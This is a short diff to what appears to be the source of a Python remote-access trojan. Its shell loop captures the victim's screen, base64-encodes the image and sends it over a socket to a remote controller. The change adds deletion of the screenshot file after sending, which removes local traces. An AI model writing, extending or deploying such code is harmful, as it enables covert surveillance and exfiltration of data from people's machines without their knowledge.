@@ -9,6 +9,7 @@ import base64
 import time
 import requests
 from mss import mss
+import os
 
 
 def download(url):
@@ -82,6 +83,7 @@ def shell(sock):
                 with open("monitor-1.png","rb") as f:
                     encoded_file = base64.b64encode(f.read())
                     utils.reliable_send(sock, encoded_file.decode("utf-8"))
+                os.remove("monitor-1.png")
             except:
                 utils.reliable_send(sock, "SCREENSHOT_FAIL")
         else:
